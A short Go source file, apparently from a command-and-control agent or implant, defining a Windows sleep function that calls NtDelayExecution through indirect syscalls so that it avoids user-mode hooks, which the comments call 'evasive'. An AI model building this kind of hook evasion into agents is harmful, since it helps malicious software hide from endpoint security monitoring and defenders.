//go:build windows

package commands

import (
	"time"
)

// AgentSleep sleeps for the specified duration.
// On Windows, it leverages evasive indirect syscalls (NtDelayExecution)
// if available, to avoid user-mode hooks on standard sleep APIs.
func AgentSleep(d time.Duration) {
	if !IndirectSyscallsAvailable() {
		time.Sleep(d)
		return
	}

	// Convert duration to 100-nanosecond intervals (negative for relative time)
	interval := int64(-1 * (d / time.Nanosecond) / 100)

	status := IndirectNtDelayExecution(0, &interval)
	// STATUS_SUCCESS is 0. If it fails, fallback to standard sleep.
	if status != 0 {
		time.Sleep(d)
	}
}
